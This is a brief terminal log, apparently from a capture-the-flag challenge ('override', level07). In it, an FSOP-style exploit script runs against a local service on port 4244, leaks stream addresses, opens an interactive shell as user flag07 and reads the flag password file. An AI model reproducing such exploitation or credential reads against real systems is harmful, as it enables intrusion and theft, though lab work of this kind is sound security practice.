```sh
level07@override:~$ echo "" >  exploit.py && vim exploit.py  && python3 exploit.py 
[+] Opening connection to 0.0.0.0 on port 4244: Done
0x598729ad73bb
b'[FSOP] stream 0 @ 0x59876938c2a0'
0x59876938c2a0
b''
b'[FSOP] stream 1 @ 0x59876938c2f0'
b''
[*] Switching to interactive mode
$ ls
bin
bin.usr-is-merged
boot
cdrom
dev
etc
home
lib
lib64
lib.usr-is-merged
lost+found
media
mnt
opt
proc
root
run
sbin
sbin.usr-is-merged
snap
srv
swap.img
sys
tmp
usr
var
$ whoami
flag07
$ cat /home/flag07/.pass
qmumcu881eow3vb0vq7sbxreq0osbpu6
```